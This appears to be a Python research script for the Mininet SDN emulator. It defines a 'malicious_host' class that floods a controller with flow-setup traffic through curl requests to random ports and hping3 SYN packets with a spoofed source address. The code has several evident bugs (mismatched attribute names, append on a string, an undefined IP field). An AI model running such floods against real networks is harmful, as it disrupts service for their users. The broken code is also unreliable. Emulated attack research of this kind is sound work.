from mininet.net import Mininet
from time import sleep
import time
from datetime import datetime
from random import randrange, choice, random


# ip can be in the same subnet (means that the first 3 octets are the same)
# or in different subnet (means that the first 3 octets are different
# TODO consider which case is better for the attack
# attack ip needs to be in the SDN since it floods the controller and do not build a flow it is useless
def ip_generator():
    ip = ".".join(map(str, (randrange(256) for _ in range(4)))) 
    return ip
 
# attack can be on the different ports in the same IP 
def port_generator():
    return randrange(1024, 65535)
  

class malicious_host():
  def __init__(self,name, net, idle_timeout) -> None:
    self.net = net
    self.name = name
    self.idle_timeout = idle_timeout
    self.attacks = []
    
    
  # This attack is to send a lot of flow entries to the switch in different ports with same IP
  # different dest_port
  def attack_controller_port(self, attack_duration, attack_number , victim_ip):
    start_time = time.time()
    count = 0
    while( time.time() - start_time < attack_duration):
      for j in self.attack:
        self.net.cmd(j)
        count += 1
        sleep(0.1)
      for i in range(attack_number):
        attack_port = random.randint(80, 65000)
        attack = f'{self.name} curl {victim_ip}:{attack_port}'
        self.net.cmd(attack)
        attack.append(attack)
        count += 1
        sleep(0.1)
    
    # different source ip
    # TODO thıs attack needs real Ip addresses from SDN
  def attack_controller_ip(self, attack_duration, attack_number , victim_ip):
    #h1 hping3 -c 10 -S -p 9000 -a 192.168.1.100 10.0.0.2 can be used for IP attack
    start_time = time.time()
    count = 0
    while( time.time() - start_time < attack_duration):
      for j in self.attack:
        self.net.cmd(j)
        count += 1
        sleep(0.1)
      for i in range(attack_number):
        # attack_ip = ip_generator()
        attack = f'{self.name} h1 hping3 -S -a {self.ip} -s 12345 -p 80 -c 5 {victim_ip}'
        self.net.cmd(attack)
        attack.append(attack)
        count += 1
        sleep(0.1)
    return count
